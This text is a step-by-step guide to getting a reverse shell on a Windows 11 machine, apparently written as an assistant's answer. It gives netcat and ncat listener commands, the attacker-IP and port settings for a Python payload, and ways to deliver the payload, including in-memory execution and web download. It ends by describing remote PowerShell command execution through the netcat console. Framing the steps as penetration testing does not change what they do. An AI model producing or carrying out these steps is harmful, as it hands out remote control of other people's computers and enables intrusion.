Part 1: Setting up the Listener (Attacker Machine)
The attacker machine in this setup is the one that will "catch" the connection from the target.
Identify Your IP: Find the IP address of your listening machine. This is the ATTACKER_IP you will put into the Python script.
Start the Netcat Listener: Use a command-line utility like Netcat (often bundled as nc or ncat). This example uses port 4444, but you can choose any open port.
bash
# For a traditional Linux/macOS Netcat
nc -lvnp 4444 

# For Nmap's Ncat (usually if you're on Windows or prefer a more modern tool)
ncat -lvnp 4444
-l: Listen mode
-v: Verbose (for connection information)
-n: Numeric-only IP addresses (no DNS lookup)
-p: Specifies the port to listen on
Your machine is now waiting for the reverse connection.
Part 2: Preparing and Running the Payload (Target Windows 11 Machine)
Configure the Payload: Before moving the script, edit the Python file (payload.py or similar) and replace the placeholders with your attacker machine's information:
python



RHOST = "YOUR_ATTACKER_IP"  # MUST be your actual IP
RPORT = 4444              # MUST match the port you're listening on
Transfer the Payload: You need a method to get the Python script onto the Windows 11 target machine. In a penetration test, this step often involves exploiting a vulnerability or using an existing access vector. Common transfer methods include:
In-Memory Execution: Executing the code directly in memory using tools that convert the Python script to an executable or a stage in an existing exploit, avoiding writing a file to disk.
Web Download: Using PowerShell or the target's web browser to download the file from a server you control.
SMB Share: Transferring the file over a Server Message Block (SMB) share.
Execute the Script: Once the Python file is on the target machine, you simply need to execute it using the Python interpreter. Windows 11 usually comes with Python accessible, or it may have been installed by the user. Navigate to the directory containing the script in a command prompt or PowerShell window and run:
bash



python payload.py
Expected Outcome
When the python payload.py command is executed on the target, two things should happen:

Listener: Your Netcat listener on the attacker machine will show a message indicating an incoming connection (e.g., "Connection received on YOUR_ATTACKER_IP 4444").
Shell: The connection will establish, and you can now send shell commands from your Netcat console. These commands will be executed on the Windows 11 target via PowerShell, and the output will be displayed back in your Netcat window.
